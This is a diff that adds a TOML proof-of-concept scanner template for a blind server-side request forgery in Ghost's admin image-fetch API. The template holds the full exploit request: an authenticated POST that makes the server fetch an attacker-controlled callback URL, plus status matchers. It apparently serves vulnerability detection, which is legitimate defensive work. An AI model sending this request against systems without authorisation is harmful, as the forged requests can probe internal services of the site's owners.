@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "通过在 Ghost Admin 图片抓取功能中指定恶意 URL，验证服务器是否向外部或内部目标发起 HTTP GET 请求（盲 SSRF）。"
+id = "POC-AVE-2026-1393"
+name = "Ghost Server-Side Request Forgery in Image Fetching PoC"
+severity = "medium"
+tags = ["ave-2026-1393"]
+vuln_id = [
+    "CVE-2026-70591",
+    "AVE-2026-1393",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/ghost/api/admin/images/fetch"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"url": "http://{{interactsh-url}}"}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    201,
+    202,
+]
+type = "status"
